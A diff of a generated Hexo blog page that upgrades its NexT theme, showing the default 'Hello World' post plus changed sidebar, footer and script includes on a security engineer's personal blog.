       <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/10/30/hello-world/" itemprop="url">Hello World</a></h1>
-        
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/10/30/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
+        </h1>
 
         <div class="post-meta">
-          <span class="post-time">
-            
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-30T21:47:42+08:00">
-                2019-10-30
-              </time>
-            
+              <span class="post-meta-item-text">发表于</span>
 
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2019/10/30/hello-world/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2019/10/30/hello-world/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
+              <time title="创建时间：2019-10-30 21:47:42" itemprop="dateCreated datePublished" datetime="2019-10-30T21:47:42+08:00">2019-10-30</time>
+            </span>
 
           
 
         </div>
       </header>
-    
 
     
     
@@ -490,12 +306,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-      
-
-      
-        
-          
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+          <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
 <h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
 
 <p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
@@ -509,199 +320,130 @@
 
 <p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
 
-          
-        
       
     </div>
-    
-    
-    
 
     
-
     
-
     
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
+      <footer class="post-footer">
         <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
+      </footer>
   </article>
+  
+  
+  
 
-
-    
-  </section>
+  </div>
 
   
+
 
 
           </div>
           
 
-
-          
-
         </div>
-        
           
   
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
   </div>
 
-  <aside id="sidebar" class="sidebar">
-    
+  <aside class="sidebar">
     <div class="sidebar-inner">
 
-      
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
 
-      
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image"
-                src="/images/avatar.gif"
-                alt="Jas502n" />
-            
-              <p class="site-author-name" itemprop="name">Jas502n</p>
-              <p class="site-description motion-element" itemprop="description">一个安全工程师的成长笔记史</p>
-          </div>
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="site-author-image" itemprop="image" alt="Jas502n"
+    src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Jas502n</p>
+  <div class="site-description" itemprop="description">一个想学pwn的web狗🐶</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jas502n" title="GitHub &amp;rarr; https:&#x2F;&#x2F;github.com&#x2F;jas502n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/jas502n" title="Twitter &amp;rarr; https:&#x2F;&#x2F;twitter.com&#x2F;jas502n" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://youtube.com/jas502n" title="YouTube &amp;rarr; https:&#x2F;&#x2F;youtube.com&#x2F;jas502n" rel="noopener" target="_blank"><i class="fa fa-fw fa-youtube"></i>YouTube</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:jas502n@gmail.com" title="EMail &amp;rarr; mailto:jas502n@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>EMail</a>
+      </span>
+  </div>
 
-          <nav class="site-state motion-element">
 
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives/%7C%7C%20archive">
-              
-                  <span class="site-state-item-count">2</span>
-                  <span class="site-state-item-name">日志</span>
-                </a>
-              </div>
-            
 
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                
-                  <span class="site-state-item-count">1</span>
-                  <span class="site-state-item-name">标签</span>
-                
-              </div>
-            
-
-          </nav>
-
-          
-            <div class="feed-link motion-element">
-              <a href="/atom.xml" rel="alternate">
-                <i class="fa fa-rss"></i>
-                RSS
-              </a>
-            </div>
-          
-
-          
-            <div class="links-of-author motion-element">
-                
-                  <span class="links-of-author-item">
-                    <a href="https://github.com/jas502n" target="_blank" title="GitHub">
-                      
-                        <i class="fa fa-fw fa-github"></i>GitHub</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="https://twitter.com/jas502n" target="_blank" title="Twitter">
-                      
-                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="https://youtube.com/jas502n" target="_blank" title="YouTube">
-                      
-                        <i class="fa fa-fw fa-youtube"></i>YouTube</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="mailto:jas502n@gmail.com" target="_blank" title="EMail">
-                      
-                        <i class="fa fa-fw fa-envelope"></i>EMail</a>
-                  </span>
-                
-            </div>
-          
-
-          
-          
-
-          
-          
-
-          
-
-        </div>
-      </section>
-
-      
-
-      
+      </div>
 
     </div>
   </aside>
+  <div id="sidebar-dimmer"></div>
 
 
-        
       </div>
     </main>
 
-    <footer id="footer" class="footer">
+    <footer class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; 2015 &mdash; <span itemprop="copyrightYear">2019</span>
+        
+
+<div class="copyright">
+  
+  &copy; 2015 – 
+  <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">Jas502n</span>
-
-  
 </div>
-
-
-  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
-
-
-
+  <div class="powered-by">Copyright © 2015 - 2019 Jas502n 版权所有 all rights reserved v4.0.0
+  </div>
 
         
+
+
+
+
+
 
 
 
@@ -712,31 +454,15 @@
         
       </div>
     </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
   </div>
 
   
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
-
-
-
-
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
 
 
 
@@ -753,124 +479,9 @@
 
 
 
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
 
 
 
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
-
-
-
-  
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-  
-    
-  
-
-  <script type="text/javascript">
-    var duoshuoQuery = {short_name:"jas502n"};
-    (function() {
-      var ds = document.createElement('script');
-      ds.type = 'text/javascript';ds.async = true;
-      ds.id = 'duoshuo-script';
-      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-      ds.charset = 'UTF-8';
-      (document.getElementsByTagName('head')[0]
-      || document.getElementsByTagName('body')[0]).appendChild(ds);
-    })();
-  </script>
-
-  
-    
-    
-    <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
-    <script src="/js/src/hook-duoshuo.js"></script>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  
-
-  
 
   
 
